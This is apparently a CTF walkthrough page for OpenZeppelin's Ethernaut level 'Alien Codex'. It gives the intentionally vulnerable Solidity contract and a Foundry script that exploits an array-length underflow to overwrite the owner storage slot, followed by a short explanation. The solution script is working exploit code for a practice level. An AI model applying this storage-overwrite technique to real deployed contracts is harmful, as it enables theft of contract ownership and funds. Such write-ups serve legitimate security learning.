---
title: "Alien Codex"
date: "2024-02-25T10:35:00.000Z"
lastmod: "2024-02-25T16:30:00.000Z"
draft: false
difficulty: "⭐⭐⭐⭐"
prev: "Magic-Number-6d707756089b4bb286e3ce6cad62ac5c"
weight: 20
state: "En cours"
level-url: "https://ethernaut.openzeppelin.com/level/19"
next: "Denial-edd8839ce63a4a2194adfd2905ad4940"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "d14fa389-394f-4031-b7c2-ffcdeeebeb56"
  created_time: "2024-02-25T10:35:00.000Z"
  last_edited_time: "2024-02-25T16:30:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "f9c2f40a-0144-4e6d-a134-6b9fd725f7a9"
        name: "⭐⭐⭐⭐"
        color: "red"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Magic-Number-6d707756089b4bb286e3ce6cad62ac5c"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Magic-Number-6d707756089b4bb286e3ce6cad62ac5c"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 20
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "e1f6ef4b-49ae-427f-9bb4-8736089f3aa2"
        name: "En cours"
        color: "blue"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/19"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Denial-edd8839ce63a4a2194adfd2905ad4940"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Denial-edd8839ce63a4a2194adfd2905ad4940"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Alien Codex"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Alien Codex"
          href: null
  url: "https://www.notion.so/Alien-Codex-d14fa389394f4031b7c2ffcdeeebeb56"
  public_url: null
UPDATE_TIME: "2024-02-25T16:30:58.150Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


You've uncovered an Alien contract. Claim ownership to complete the level.


Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface AlienCodex {
  function contact() external returns(bool);
  function codex() external returns(bytes32[] memory);
  function makeContact() external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
  function owner() external returns(address);
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address pubKey = vm.envAddress("PUBLIC_KEY");
        address addr = vm.envAddress("INSTANCE_19");

        vm.startBroadcast(deployerPrivateKey);

        AlienCodex codex = AlienCodex(addr);

        // codex array at slot 1 => first elt in the array at slot keccak256(1)
        uint eltSlot = uint(keccak256(abi.encode(1)));

        // owner address is stored on the first 20 bytes of slot 0
        uint distanceFromSlot0 = type(uint).max - eltSlot;

        codex.makeContact();

        // length underflow; now codex is of length type(uint).max
        // which allows us to reach every possible slot of the contract
        codex.retract();

        // write attacker's address at slot 0
        codex.revise(distanceFromSlot0 + 1, bytes32(abi.encode(pubKey)));

        console.logAddress(codex.owner());

        vm.stopBroadcast();

    }
}
```


This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.


Additionally, it exploits the arithmetic underflow of array length, 
by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.


Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)

